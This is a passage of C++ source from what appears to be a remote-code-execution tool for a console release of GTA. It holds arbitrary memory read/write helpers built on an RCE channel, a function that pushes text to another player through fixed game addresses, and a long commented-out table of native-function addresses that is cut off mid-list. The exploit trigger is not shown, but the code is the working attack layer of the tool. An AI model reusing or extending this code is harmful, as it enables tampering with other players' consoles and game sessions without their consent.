		while ((data = (int*)getRCEReturnValues()) == 0) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 004\n", 100000); break; } };
		//return ret;
		/*if (data != 0)
			return data[0];
		return 0;*/
		return data;
	}

	int read32(int address) {
		int *data = read43(address);
		if (data != 0)
			return data[0];
		print3("~r~ERROR");
		return 0;
	}

	void read(int address, void* arr, int sizeInBytes, bool printProgress = false) {
		int* arrInt = (int*)arr;
		char* arrChar = (char*)arr;
		int sizeDiv4 = sizeInBytes / 4;
		int leftoverBytesAmount = sizeInBytes % 4;
		int curIndex = 0;

		for (int i = 0; i < sizeDiv4; i+=43) {
			int *vals = read43(address + i * 4);//vals is size of 43
			if (vals == 0) {
				print3("~r~ERROR");
				return;
			}
			for (int j = 0; j < 43; j++) {
				printf("%X ",vals[j]);
				if (curIndex < sizeDiv4) {
					arrInt[curIndex] = vals[j];
					curIndex++;
				}
			}
			printf("\n");

			if (printProgress) {
				float percentage = (float)curIndex / (float)sizeDiv4;
				char buf[100];
				snprintf$(buf, sizeof(buf), "%.1f%%", percentage * 100);
				printf("%s\n", buf);
			}
		}

		int leftoverBytes = 0;
		if (leftoverBytesAmount) {
			int lastVal = read32(address + curIndex*4);//get the last valye
			int getIndex = 0;
			while (leftoverBytesAmount > 0) {
				arrChar[curIndex*4 + getIndex] = (char)((lastVal & (0xFF000000 >> (getIndex * 8))) >> ((3 - getIndex) * 8));
				leftoverBytesAmount--;
				//curIndex++;
				getIndex++;
			}
		}

	}

	/*
	//this is the old one utilizing only read32 and not supporting larger read amounts
	void read(int address, void *arr, int sizeInBytes, bool printProgress = false) {
		int* arrInt = (int*)arr;
		char* arrChar = (char*)arr;
		int sizeDiv4 = sizeInBytes / 4;//8 would get 2, 9 would get
		int leftoverBytesAmount = sizeInBytes % 4;
		int curIndex = 0;
		for (int i = 0; i < sizeDiv4; i++) {
			int val = read32(address + i*4);
			arrInt[i] = val;
			curIndex += 4;

			if (printProgress) {
				float percentage = (float)curIndex / (float)sizeInBytes;
				char buf[100];
				snprintf$(buf, sizeof(buf), "%.1f%%", percentage * 100);
				printf("%s\n",buf);
			}
		}
		int leftoverBytes = 0;
		if (leftoverBytesAmount) {
			int lastVal = read32(address + curIndex);
			int getIndex = 0;
			while (leftoverBytesAmount > 0) {
				arrChar[curIndex] = (char)((lastVal & (0xFF000000 >> (getIndex * 8)))   >> ((3 - getIndex) * 8));
				leftoverBytesAmount--;
				curIndex++;
				getIndex++;
			}
		}
	}
	*/

	//strLen is length of buffer
	void readString(int address, char *str, int strLen) {
		//read(address, str, strLen);
		int i = 0;
		while (true) {

			int readValue = read32(address + i);

			char a = (char)((readValue & (0xFF000000 >> (0 * 8))) >> ((3 - 0) * 8));
			char b = (char)((readValue & (0xFF000000 >> (1 * 8))) >> ((3 - 1) * 8));
			char c = (char)((readValue & (0xFF000000 >> (2 * 8))) >> ((3 - 2) * 8));
			char d = (char)((readValue & (0xFF000000 >> (3 * 8))) >> ((3 - 3) * 8));


			if (strLen > 0)
				str[i] = a;
			i++;
			strLen--;
			if (strLen > 0)
				str[i] = b;
			i++;
			strLen--;
			if (strLen > 0)
				str[i] = c;
			i++;
			strLen--;
			if (strLen > 0)
				str[i] = d;
			i++;
			strLen--;

			if (a == 0 || b == 0 || c == 0 || d == 0)
				break;

			if (strLen <= 0)
				break;
		}
	}

	void write_sixOrLess(int address, int* arr, int size, bool skipReturnWait = false) {
		if (abortAllCalls)
			return;
		getRCEReturnValues();//clear any previous requests that may be left over due to lazy coding...
		//setGTAInTLS();
		//sleep(100);//sleep 100 ms
		//callRCEWriteFunction(address,size,arr);
		hooked::address = address; 
		hooked::arr = arr;
		hooked::size = size;
		hooked::queWrite = true;
		int counter = 0;
		while (hooked::queWrite == true) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 005\n", 100000); break; } };//pause until it is sent

		int ret = 0;
		//int timeBefore = time(0);
		counter = 0;
		//while (getRCEFunctionCallback(&ret) == false) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 006\n", 100000); break; } }//wait for response

		if (skipReturnWait == false) {
			void* data = 0;
			while ((data = getRCEReturnValues()) == 0) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 004\n", 100000); break; } };
		}

		//int timeAfter = time(0);
		//int timeDif = timeAfter-timeBefore;
		//printf("Time for read: %i\n",timeDif);
	}

	void write(int address, char* arrr, int sizeInBytes, int waitingInterval = 1) {
		if (abortAllCalls)
			return;
		if (sizeInBytes % sizeof(int) != 0)
			sizeInBytes += (sizeof(int) - (sizeInBytes % sizeof(int)));
		int* arr = (int*)arrr;
		int size = sizeInBytes / 4;
		const int splitSize = maxIntsPerPacket;//20 works, but slow. I think 24 might be max
		int totalSize = size;
		int index = 0;

		int currentInterval = 0;

		while (totalSize > 0) {
			int ws = splitSize;
			if (totalSize < splitSize) {
				ws = totalSize;
			}

			currentInterval++;
			bool skipWait = true;//default skip wait
			if (currentInterval == waitingInterval) {
				skipWait = false;//tell it to not skip the wait this time, to make sure it catched up
				currentInterval = 0;
			}

			write_sixOrLess(address + index * 4, &arr[index], ws, skipWait);

			index += ws;  
			totalSize -= ws;
		}
		//sleep(1000);
		//int ret = 0;
		//while (getRCEFunctionCallback(&ret) == false){sleep(1);}//pick up return value
	}

	void writeQuick(int address, char* arrr, int sizeInBytes, int waitingInterval = 1) {
		if (abortAllCalls)
			return;
		if (sizeInBytes % sizeof(int) != 0)
			sizeInBytes += (sizeof(int) - (sizeInBytes % sizeof(int)));
		int* arr = (int*)arrr;
		int size = sizeInBytes / 4;
		const int splitSize = maxIntsPerPacket;//20 works, but slow. I think 24 might be max
		int totalSize = size;
		int index = 0;

		int currentInterval = 0;

		while (totalSize > 0) {
			int ws = splitSize;
			if (totalSize < splitSize) {
				ws = totalSize;
			}

			currentInterval++;
			bool skipWait = true;//default skip wait
			if (currentInterval == waitingInterval) {
				skipWait = false;//tell it to not skip the wait this time, to make sure it catched up
				currentInterval = 0;
			}

			write_sixOrLess(address + index * 4, &arr[index], ws, skipWait);

			index += ws;
			totalSize -= ws;
		}
		//sleep(1000);
		//int ret = 0;
		//while (getRCEFunctionCallback(&ret) == false){sleep(1);}//pick up return value
	}

	void write32(int address, int value) {
		if (abortAllCalls)
			return;
		write(address, (char*)&value, sizeof(int));
	}

	int writeString(int address, char* str) {
		if (abortAllCalls)
			return 0;
		//int writeCount = (((int)strlen(str))/4) + 1;
		write(address, str, strlen(str)+1/*writeCount*/);
		return address;
	}

	int writeStringLength(int address, char* str, int length) {
		if (abortAllCalls)
			return 0;
		write(address, str, length);
		return address;
	}

	void printPlayer(char* text, bool enabled = true) {
		if (abortAllCalls)
			return;
		if (enabled) {
			//printf("Sending text to playyer...\n");
			writeString(isBLUSVersionOfGame ? 0x20773CC/*BLUS*/ : 0x2066FCC, text);
			//printf("Done writing string\n");
			int val = 3;
			write(isBLUSVersionOfGame ? 0x2077ADC/*BLUS*/ : 0x20676DC, (char*)&val, sizeof(int));
		}
		else {
			int val = 1;
			write(isBLUSVersionOfGame ? 0x2077ADC/*BLUS*/ : 0x20676DC, (char*)&val, sizeof(int));
		}
	}


	//static unsigned int allNativesAddresses[] = { 0x1C25B70, 0x1C25BD0, 0x1C28F40, 0x1C29040, 0x1C24CA8, 0x1C24A78, 0x1C274D8, 0x1C243A8, 0x1C24648, 0x1C26810, 0x1C271D8, 0x1C2DD90, 0x1C2C808, 0x1C2CB60, 0x1C2C620, 0x1C2C630, 0x1C2C6D0, 0x1C25800, 0x1C24D88, 0x1C24E50, 0x1C27780, 0x1C4E160, 0x1C25EE0, 0x1C26118, 0x1C2B050, 0x1C2BDA0, 0x1C2E7E8, 0x1C2A2A0, 0x1C248E0, 0x1C29790, 0x1C29DD0, 0x1C26A20, 0x1C24B50, 0x1C2C738, 0x1C2C900, 0x1C2EA00, 0x1C252E0, 0x1C253D8, 0x1C256D0, 0x1C25808, 0x1C23908, 0x1C23960, 0x1C246B8, 0x1C26FC0, 0x1C2D170, 0x1C2DB80, 0x1C2A1D0, 0x1C28C58, 0x1C29CD8, 0x1C24BC0, 0x1C2E410, 0x1C2E4D8, 0x1C2E8E0, 0x1C2E938, 0x1C2C9E0, 0x1C2ECB0, 0x1C28B70, 0x1C27408, 0x1C2A7A8, 0x1C2A7F0, 0x1C2BA38, 0x1C2DE88, 0x1C2DEC0, 0x1C2DFB8, 0x1C4E0F8, 0x1C24278, 0x1C24508, 0x1C26470, 0x1C26CD8, 0x1C27108, 0x1C27290, 0x1C24B88, 0x1C25918, 0x1C28B18, 0x1C29530, 0x1C29838, 0x1C2CBD0, 0x1C24DC0, 0x1C2C310, 0x1C2A768, 0x1C2B8A8, 0x1C2D700, 0x1C2D9C8, 0x1C2E0D0, 0x1C2EC48, 0x1C2EC98, 0x1C4E1A0, 0x1C23A50, 0x1C23BD0, 0x1C24670, 0x1C25EC8, 0x1C26910, 0x1C26EE8, 0x1C2D1F8, 0x1C2E518, 0x1C25220, 0x1C28AF8, 0x1C295A0, 0x1C23D98, 0x1C23E68, 0x1C243B8, 0x1C24548, 0x1C24600, 0x1C2A8B8, 0x1C2AC00, 0x1C26AF8, 0x1C2B738, 0x1C24E60, 0x1C2C088, 0x1C2C1F0, 0x1C2E290, 0x1C2C770, 0x1C25A90, 0x1C291B8, 0x1C291E0, 0x1C298A0, 0x1C26A10, 0x1C245A8, 0x1C245F8, 0x1C25E98, 0x1C26738, 0x1C2A790, 0x1C2B150, 0x1C2D638, 0x1C29B80, 0x1C26B00, 0x1C24D00, 0x1C27648, 0x1C2C7F0, 0x1C2C960, 0x1C2EB18, 0x1C28C28, 0x1C28F50, 0x1C29320, 0x1C29B78, 0x1C239F0, 0x1C23C28, 0x1C23E88, 0x1C23EE0, 0x1C26D98, 0x1C2E5B0, 0x1C2A288, 0x1C24EC0, 0x1C29818, 0x1C29858, 0x1C29B08, 0x1C29EF0, 0x1C29F78, 0x1C240B0, 0x1C240E8, 0x1C2A238, 0x1C2C580, 0x1C2C6A0, 0x1C25A28, 0x1C248E8, 0x1C24908, 0x1C29678, 0x1C260B8, 0x1C26D88, 0x1C2BA78, 0x1C2D250, 0x1C2D550, 0x1C2D7B8, 0x1C2DF08, 0x1C24930, 0x1C29770, 0x1C24C10, 0x1C24C48, 0x1C2BD90, 0x1C2D178, 0x1C2D258, 0x1C2D318, 0x1C2E660, 0x1C2A4C8, 0x1C25298, 0x1C23F88, 0x1C25D98, 0x1C26860, 0x1C27348, 0x1C2A710, 0x1C2AD90, 0x1C2BC70, 0x1C249D8, 0x1C2C128, 0x1C274B8, 0x1C25A40, 0x1C28DF8, 0x1C292E8, 0x1C29BF0, 0x1C269E8, 0x1C24FD8, 0x1C2C070, 0x1C2D2F0, 0x1C2D8E0, 0x1C2E498, 0x1C2E7C8, 0x1C2C848, 0x1C2A428, 0x1C2EB38, 0x1C239A8, 0x1C25EA8, 0x1C26498, 0x1C26718, 0x1C26C00, 0x1C26E20, 0x1C2ADB8, 0x1C2A470, 0x1C258D0, 0x1C28D08, 0x1C28E18, 0x1C299C8, 0x1C24B38, 0x1C27080, 0x1C2A8D0, 0x1C2ABE0, 0x1C2B278, 0x1C2E588, 0x1C29FB8, 0x1C2A018, 0x1C23980, 0x1C24088, 0x1C26030, 0x1C26190, 0x1C26450, 0x1C26F30, 0x1C27050, 0x1C2E980, 0x1C2C080, 0x1C277B8, 0x1C2DAF8, 0x1C2DB40, 0x1C2E8D0, 0x1C253B8, 0x1C29220, 0x1C29A08, 0x1C29BA0, 0x1C4E130, 0x1C24070, 0x1C25F90, 0x1C2AE50, 0x1C2BA68, 0x1C2D428, 0x1C2D770, 0x1C24740, 0x1C295A8, 0x1C29C60, 0x1C2B850, 0x1C2C210, 0x1C2DC68, 0x1C2DE08, 0x1C2CA20, 0x1C2EA88, 0x1C2EB60, 0x1C2EB80, 0x1C25388, 0x1C2AFD0, 0x1C2B258, 0x1C2B440, 0x1C2B548, 0x1C2BA60, 0x1C2BBB0, 0x1C2D438, 0x1C23EF0, 0x1C25E30, 0x1C26058, 0x1C260C0, 0x1C26308, 0x1C26D58, 0x1C2A8C8, 0x1C28F38, 0x1C29108, 0x1C29290, 0x1C294F8, 0x1C249B8, 0x1C2C2C8, 0x1C27730, 0x1C2A8E8, 0x1C2AD58, 0x1C2AE10, 0x1C2B2D8, 0x1C2B3A0, 0x1C2BB10, 0x1C2DD10, 0x1C4E100, 0x1C23EB8, 0x1C24638, 0x1C26138, 0x1C261C0, 0x1C263C8, 0x1C264F8, 0x1C24FE0, 0x1C255E0, 0x1C28A98, 0x1C28AD0, 0x1C28B30, 0x1C28B60, 0x1C29670, 0x1C2B820, 0x1C27120, 0x1C2BBC8, 0x1C2BE48, 0x1C2C460, 0x1C2CB58, 0x1C2EB98, 0x1C25408, 0x1C2C190, 0x1C255A0, 0x1C25980, 0x1C24900, 0x1C29578, 0x1C29688, 0x1C29D18, 0x1C25148, 0x1C2DBA0, 0x1C2A098, 0x1C2C798, 0x1C2C800, 0x1C2C9F0, 0x1C2EAF8, 0x1C2EBD8, 0x1C23B20, 0x1C25E28, 0x1C26028, 0x1C26558, 0x1C2AD08, 0x1C2B948, 0x1C2D620, 0x1C28F28, 0x1C24EF8, 0x1C275E0, 0x1C27738, 0x1C2E4F0, 0x1C2C3B8, 0x1C2A498, 0x1C2A558, 0x1C28BE8, 0x1C28E28, 0x1C28EE8, 0x1C24268, 0x1C25DE8, 0x1C260C8, 0x1C26228, 0x1C26728, 0x1C2B270, 0x1C2D240, 0x1C258C0, 0x1C296B0, 0x1C29A20, 0x1C29A78, 0x1C2E9C8, 0x1C2C0D8, 0x1C24BA8, 0x1C2D410, 0x1C2DDF8, 0x1C2E320, 0x1C2E700, 0x1C29FF8, 0x1C2C438, 0x1C2A4B8, 0x1C23CE8, 0x1C23D80, 0x1C26F48, 0x1C273A0, 0x1C2AC18, 0x1C2AD10, 0x1C2B078, 0x1C27540, 0x1C27578, 0x1C2E430, 0x1C2C3A0, 0x1C2C7A0, 0x1C2CA58, 0x1C2EC78, 0x1C26A60, 0x1C26AA8, 0x1C2B1B8, 0x1C2B908, 0x1C2BDB0, 0x1C2D648, 0x1C2D658, 0x1C2D6D8, 0x1C2E098, 0x1C239C0, 0x1C246F0, 0x1C25E90, 0x1C267C8, 0x1C27038, 0x1C2A9F0, 0x1C2ABC8, 0x1C24D40, 0x1C27720, 0x1C24728, 0x1C290D8, 0x1C29140, 0x1C29518, 0x1C29D00, 0x1C29EC8, 0x1C26A90, 0x1C2B9F8, 0x1C2DA40, 0x1C2DB18, 0x1C2DBA8, 0x1C2C8D0, 0x1C2CA30, 0x1C25620, 0x1C23DF0, 0x1C25FE0, 0x1C263D8, 0x1C26768, 0x1C26F60, 0x1C2B568, 0x1C2B5D8, 0x1C25840, 0x1C25970, 0x1C24780, 0x1C26AC8, 0x1C27058, 0x1C2D7C0, 0x1C2DAA8, 0x1C2E548, 0x1C2C428, 0x1C2CA00, 0x1C255A8, 0x1C23968, 0x1C24118, 0x1C262A8, 0x1C26328, 0x1C26650, 0x1C26D20, 0x1C26DB8, 0x1C29360, 0x1C293D8, 0x1C298F8, 0x1C29AC8, 0x1C29E68, 0x1C24958, 0x1C2D0C8, 0x1C2DCC0, 0x1C2E190, 0x1C2E388, 0x1C2E3F0, 0x1C2EA50, 0x1C28B88, 0x1C24598, 0x1C2A938, 0x1C2AA38, 0x1C2B310, 0x1C2B350, 0x1C2B4C8, 0x1C2BE50, 0x1C25340, 0x1C291F0, 0x1C29378, 0x1C29748, 0x1C29D28, 0x1C26BB8, 0x1C25100, 0x1C2E6A0, 0x1C2E928, 0x1C2BFD0, 0x1C2C008, 0x1C2C4A0, 0x1C2A4B0, 0x1C2EA90, 0x1C24460, 0x1C260D0, 0x1C27268, 0x1C2B328, 0x1C2D720, 0x1C2DB70, 0x1C2DF30, 0x1C2BF48, 0x1C2C6C0, 0x1C2A410, 0x1C25350, 0x1C24D18, 0x1C23950, 0x1C26760, 0x1C26E40, 0x1C26E88, 0x1C270F0, 0x1C2BD40, 0x1C2D5C8, 0x1C2DFE8, 0x1C2A488, 0x1C2EB58, 0x1C2EB90, 0x1C28B68, 0x1C29988, 0x1C23FE8, 0x1C27138, 0x1C2A748, 0x1C2AAC0, 0x1C2AE58, 0x1C2BCD8, 0x1C2D220, 0x1C27470, 0x1C247A0, 0x1C28D00, 0x1C29AE8, 0x1C29B18, 0x1C250C0, 0x1C26B98, 0x1C2C138, 0x1C2A2E8, 0x1C2CAB0, 0x1C2EA68, 0x1C25578, 0x1C25890, 0x1C258F0, 0x1C25BE0, 0x1C2AE38, 0x1C2B1D8, 0x1C2D100, 0x1C2D5B0, 0x1C2E0C0, 0x1C2E2B0, 0x1C2E800, 0x1C24220, 0x1C25C90, 0x1C26890, 0x1C26998, 0x1C26F58, 0x1C26F78, 0x1C2A898, 0x1C2B758, 0x1C25040, 0x1C26B88, 0x1C24AB0, 0x1C2C140, 0x1C277B0, 0x1C2D400, 0x1C2D978, 0x1C2E568, 0x1C2E7B8, 0x1C2A258, 0x1C25708, 0x1C29B30, 0x1C23A10, 0x1C26320, 0x1C26368, 0x1C27048, 0x1C2A8D8, 0x1C2AC98, 0x1C2BDA8, 0x1C27698, 0x1C276D0, 0x1C25690, 0x1C28FC8, 0x1C29028, 0x1C295F0, 0x1C25108, 0x1C2C1C0, 0x1C27690, 0x1C23918, 0x1C23988, 0x1C23F68, 0x1C25E80, 0x1C2B240, 0x1C2B9E8, 0x1C2E890, 0x1C251A0, 0x1C24B48, 0x1C2C2A0, 0x1C2E420, 0x1C2C5F0, 0x1C2EC80, 0x1C254F8, 0x1C25AB0, 0x1C25B58, 0x1C248F8, 0x1C2D5B8, 0x1C2DCD0, 0x1C2DD58, 0x1C2DD78, 0x1C2DF20, 0x1C2E000, 0x1C2E1E8, 0x1C23F00, 0x1C25FD0, 0x1C2A8C0, 0x1C2A9B8, 0x1C2BD18, 0x1C2BE98, 0x1C2BEE0, 0x1C2C488, 0x1C25AC8, 0x1C28DD0, 0x1C293C8, 0x1C249B0, 0x1C2C240, 0x1C23BE0, 0x1C26FA8, 0x1C2B388, 0x1C2D6D0, 0x1C2DCA8, 0x1C2E338, 0x1C2E870, 0x1C29660, 0x1C29AB0, 0x1C29BF8, 0x1C29CB0, 0x1C26A40, 0x1C250F0, 0x1C2A888, 0x1C2B098, 0x1C2DBE8, 0x1C2DF98, 0x1C2E538, 0x1C2A550, 0x1C255E8, 0x1C4E188, 0x1C23A30, 0x1C23A60, 0x1C24080, 0x1C26120, 0x1C26600, 0x1C2A3C0, 0x1C298D8, 0x1C298E0, 0x1C2C0C0, 0x1C27710, 0x1C2CB68, 0x1C2EA08, 0x1C2EA98, 0x1C25768, 0x1C28DD8, 0x1C28DE8, 0x1C29668, 0x1C2A880, 0x1C2B8B8, 0x1C2BEE8, 0x1C29FA8, 0x1C2BF58, 0x1C2C3C0, 0x1C2C740, 0x1C24440, 0x1C25E50, 0x1C26098, 0x1C263B0, 0x1C271B0, 0x1C272D8, 0x1C2A3B8, 0x1C24EB8, 0x1C25070, 0x1C24B10, 0x1C249D0, 0x1C24AB8, 0x1C2C1E8, 0x1C27480, 0x1C25488, 0x1C256C0, 0x1C25C38, 0x1C29250, 0x1C292F0, 0x1C29A50, 0x1C2B858, 0x1C2D608, 0x1C2DB98, 0x1C2E3A0, 0x1C2E668, 0x1C2A048, 0x1C2C408, 0x1C2C7F8, 0x1C25DC0, 0x1C26EB8, 0x1C27198, 0x1C2B230, 0x1C2B3D8, 0x1C2D350, 0x1C2D3C8, 0x1C29760, 0x1C29940, 0x1C29C40, 0x1C24F60, 0x1C27670, 0x1C2E600, 0x1C2C388, 0x1C2C638, 0x1C2C7C0, 0x1C253F0, 0x1C248B0, 0x1C28F70, 0x1C263A0, 0x1C26FD8, 0x1C2AD38, 0x1C2D530, 0x1C2D570, 0x1C2DB48, 0x1C2E2A8, 0x1C2CB80, 0x1C2CBA0, 0x1C24A98, 0x1C274C0, 0x1C2B628, 0x1C2D268, 0x1C2EBF8, 0x1C28EA8, 0x1C290B0, 0x1C29EB0, 0x1C26A18, 0x1C23FE0, 0x1C25D20, 0x1C26008, 0x1C26080, 0x1C26FB8, 0x1C2ACC0, 0x1C2AD78, 0x1C2C328, 0x1C2E770, 0x1C2E8F8, 0x1C25458, 0x1C259B0, 0x1C24730, 0x1C29C08, 0x1C24E48, 0x1C4E1B0, 0x1C23DC0, 0x1C26500, 0x1C26EA0, 0x1C26F00, 0x1C27190, 0x1C2DA78, 0x1C25450, 0x1C29A28, 0x1C240E0, 0x1C2B7F8, 0x1C24CC8, 0x1C276A0, 0x1C27718, 0x1C26C90, 0x1C27418, 0x1C2D290, 0x1C2D3F8, 0x1C2DBD0, 0x1C2E340, 0x1C2E628, 0x1C29ED0, 0x1C2B868, 0x1C25410, 0x1C25AF0, 0x1C248D0, 0x1C28BA8, 0x1C28F20, 0x1C293B0, 0x1C29DE8, 0x1C26FA0, 0x1C270D8, 0x1C2BB28, 0x1C2D588, 0x1C2DC80, 0x1C2DF90, 0x1C251F8, 0x1C2B800, 0x1C28D90, 0x1C29248, 0x1C29A30, 0x1C29C58, 0x1C29DD8, 0x1C29F20, 0x1C29F38, 0x1C2B1D0, 0x1C2B4D0, 0x1C2E038, 0x1C2E460, 0x1C2E6F0, 0x1C2CB08, 0x1C25B80, 0x1C4E1B8, 0x1C24368, 0x1C25F20, 0x1C26610, 0x1C26940, 0x1C27308, 0x1C2AAA8, 0x1C2B7D8, 0x1C26B90, 0x1C27618, 0x1C2E920, 0x1C255D0, 0x1C25618, 0x1C25720, 0x1C28D80, 0x1C299B8, 0x1C29E40, 0x1C2B2F8, 0x1C2B368, 0x1C2B370, 0x1C2B5F0, 0x1C2D358, 0x1C2DAF0, 0x1C2E288, 0x1C23B68, 0x1C25FA0, 0x1C26270, 0x1C26CF8, 0x1C26D60, 0x1C27258, 0x1C2AA80, 0x1C29AF8, 0x1C25030, 0x1C26B80, 0x1C2C090, 0x1C2DAE8, 0x1C2C4B8, 0x1C2C4D8, 0x1C25978, 0x1C28C20, 0x1C29000, 0x1C290A8, 0x1C2A368, 0x1C2B3A8, 0x1C2BB60, 0x1C2BB80, 0x1C2BE30, 0x1C2D150, 0x1C2D490, 0x1C4E178, 0x1C24498, 0x1C25F10, 0x1C264E0, 0x1C26700, 0x1C26960, 0x1C271A8, 0x1C24A80, 0x1C28B48, 0x1C291A8, 0x1C29398, 0x1C295C0, 0x1C29A90, 0x1C26A30, 0x1C26AE8, 0x1C2BE80, 0x1C2D088, 0x1C2D9A8, 0x1C2DB38, 0x1C25330, 0x1C257C8, 0x1C259C8, 0x1C23F30, 0x1C26140, 0x1C264A0, 0x1C265E0, 0x1C268C0, 0x1C26980, 0x1C2A7E0, 0x1C29C18, 0x1C29E70, 0x1C29E80, 0x1C24998, 0x1C2C130, 0x1C2E5A8, 0x1C2A0E8, 0x1C2C440, 0x1C2C718, 0x1C2EAD0, 0x1C28ED8, 0x1C28FC0, 0x1C27300, 0x1C2A840, 0x1C2B2B0, 0x1C2B408, 0x1C2BB40, 0x1C2D9E0, 0x1C2E248, 0x1C24710, 0x1C26050, 0x1C261D0, 0x1C262B0, 0x1C264A8, 0x1C26E18, 0x1C26FD0, 0x1C27688, 0x1C2EA30, 0x1C294E0, 0x1C2B768, 0x1C25140, 0x1C26B70, 0x1C24B80, 0x1C27638, 0x1C2B718, 0x1C2B8C8, 0x1C2D1E8, 0x1C2D650, 0x1C2D980, 0x1C2DEA0, 0x1C2E3E8, 0x1C23CC8, 0x1C26370, 0x1C26C38, 0x1C26E30, 0x1C271D0, 0x1C27260, 0x1C2AF60, 0x1C2CA78, 0x1C2A480, 0x1C28D68, 0x1C29180, 0x1C29908, 0x1C2B318, 0x1C2DA18, 0x1C2DB90, 0x1C2E708, 0x1C2A2D8, 0x1C2C7D0, 0x1C2CA70, 0x1C23F70, 0x1C25E38, 0x1C26D78, 0x1C27170, 0x1C27310, 0x1C2AAE0, 0x1C2AAF8, 0x1C29F58, 0x1C24CC0, 0x1C25048, 0x1C2B360, 0x1C2B608, 0x1C2BC38, 0x1C2DF40, 0x1C2E7F0, 0x1C2E8A8, 0x1C2A240, 0x1C23B50, 0x1C23B70, 0x1C26D18, 0x1C272B0, 0x1C2A3F0, 0x1C2A6B0, 0x1C2A800, 0x1C24B20, 0x1C249C0, 0x1C27530, 0x1C27608, 0x1C25508, 0x1C29B98, 0x1C29C88, 0x1C29F40, 0x1C2B760, 0x1C2B860, 0x1C25138, 0x1C2DEE0, 0x1C2E828, 0x1C2E950, 0x1C2BFC0, 0x1C2C678, 0x1C2C830, 0x1C254C0, 0x1C268E8, 0x1C26E58, 0x1C2A380, 0x1C2A9A0, 0x1C2B998, 0x1C2B9D0, 0x1C2DC28, 0x1C23D38, 0x1C246C0, 0x1C25DB0, 0x1C260D8, 0x1C26168, 0x1C26468, 0x1C26878, 0x1C29F60, 0x1C24FB0, 0x1C26BA8, 0x1C2D910, 0x1C2BF80, 0x1C2C6F0, 0x1C2C778, 0x1C257E0, 0x1C29430, 0x1C29810, 0x1C23B18, 0x1C23CB8, 0x1C23ED8, 0x1C24558, 0x1C27010, 0x1C2AA48, 0x1C2D2E0, 0x1C29A58, 0x1C25038, 0x1C25068, 0x1C25170, 0x1C2C0B8, 0x1C2C1E0, 0x1C2D378, 0x1C2D4E8, 0x1C2DBF8, 0x1C2E010, 0x1C2E758, 0x1C2E960, 0x1C2C4D0, 0x1C24000, 0x1C24658, 0x1C25FB0, 0x1C26218, 0x1C2A718, 0x1C2A728, 0x1C2BD50, 0x1C249E0, 0x1C2EAC0, 0x1C25280, 0x1C295C8, 0x1C297E0, 0x1C29C70, 0x1C26BE8, 0x1C25078, 0x1C2BA98, 0x1C2BB08, 0x1C2BB18, 0x1C2D470, 0x1C2E6A8, 0x1C2BFF8, 0x1C2A578, 0x1C23928, 0x1C23EA0, 0x1C26240, 0x1C26820, 0x1C26930, 0x1C27338, 0x1C2A348, 0x1C247C0, 0x1C290C0, 0x1C294D0, 0x1C2C068, 0x1C27490, 0x1C27328, 0x1C2B4E8, 0x1C2D880, 0x1C2E2B8, 0x1C29FD8, 0x1C2E9F0, 0x1C2EA58, 0x1C4E138, 0x1C23CD8, 0x1C24280, 0x1C262E0, 0x1C26530, 0x1C26588, 0x1C27238, 0x1C24EE0, 0x1C2C320, 0x1C2C700, 0x1C2C970, 0x1C2A518, 0x1C256E8, 0x1C25B48, 0x1C290E8, 0x1C29F68, 0x1C2DA70, 0x1C2E270, 0x1C2E5E0, 0x1C2BFD8, 0x1C2C658, 0x1C2C660, 0x1C2C6A8, 0x1C26EA8, 0x1C2A8E0, 0x1C2B140, 0x1C2BCE8, 0x1C2BE08, 0x1C2D158, 0x1C2DA58, 0x1C23C18, 0x1C25C60, 0x1C262C8, 0x1C26560, 0x1C26660, 0x1C26710, 0x1C26840, 0x1C276F0, 0x1C29860, 0x1C26A68, 0x1C26A78, 0x1C24FD0, 0x1C249F8, 0x1C2C168, 0x1C27448, 0x1C2A148, 0x1C2BFC8, 0x1C2C038, 0x1C2CB40, 0x1C254E8, 0x1C25A00, 0x1C28CB0, 0x1C2A8F0, 0x1C2A918, 0x1C2B580, 0x1C2D118, 0x1C2DC88, 0x1C2E8A0, 0x1C2E958, 0x1C23930, 0x1C23A18, 0x1C243E0, 0x1C246A0, 0x1C26510, 0x1C26618, 0x1C27370, 0x1C299A0, 0x1C29EA0, 0x1C2B778, 0x1C24F70, 0x1C24A90, 0x1C27760, 0x1C2C698, 0x1C2C8C8, 0x1C2C980, 0x1C25C00, 0x1C24840, 0x1C29260, 0x1C29288, 0x1C2ADE8, 0x1C2B068, 0x1C2D4D8, 0x1C2DA28, 0x1C2DA80, 0x1C2C4C0, 0x1C2C4C8, 0x1C298A8, 0x1C29B70, 0x1C26AD0, 0x1C24F48, 0x1C2EBC8, 0x1C25270, 0x1C25320, 0x1C25490, 0x1C25818, 0x1C28D60, 0x1C297F0, 0x1C2B4F8, 0x1C2D8F8, 0x1C2E348, 0x1C2E3C8, 0x1C2A2D0, 0x1C2C5D0, 0x1C2C818, 0x1C23CA0, 0x1C23D40, 0x1C23FB8, 0x1C25E08, 0x1C26198, 0x1C26898, 0x1C2AA98, 0x1C259B8, 0x1C25A10, 0x1C28B58, 0x1C2C330, 0x1C2BD98, 0x1C2E6E8, 0x1C2C640, 0x1C2EBF0, 0x1C25440, 0x1C25500, 0x1C25938, 0x1C24720, 0x1C25F28, 0x1C25F30, 0x1C2A680, 0x1C2A730, 0x1C2A890, 0x1C2BB30, 0x1C247F8, 0x1C2BD58, 0x1C2E1D0, 0x1C2E218, 0x1C2A1F0, 0x1C2C418, 0x1C2C768, 0x1C2EAC8, 0x1C24660, 0x1C26968, 0x1C27398, 0x1C2A640, 0x1C2AB80, 0x1C2B4D8, 0x1C2BBD8, 0x1C2C710, 0x1C25B78, 0x1C29A60, 0x1C24DA0, 0x1C2ACA8, 0x1C2B2C0, 0x1C2B6E0, 0x1C2B8D0, 0x1C2D6E0, 0x1C2E710, 0x1C2C028, 0x1C239F8, 0x1C23DB0, 0x1C24620, 0x1C25E10, 0x1C261B8, 0x1C26260, 0x1C2A920, 0x1C29380, 0x1C29BD8, 0x1C29D30, 0x1C24F68, 0x1C2D180, 0x1C2E908, 0x1C2C500, 0x1C2CA80, 0x1C252A8, 0x1C25958, 0x1C28CB8, 0x1C4E0E8, 0x1C23FF0, 0x1C245A0, 0x1C24618, 0x1C2A828, 0x1C2AD30, 0x1C2BC68, 0x1C29B58, 0x1C29E78, 0x1C24A30, 0x1C2C148, 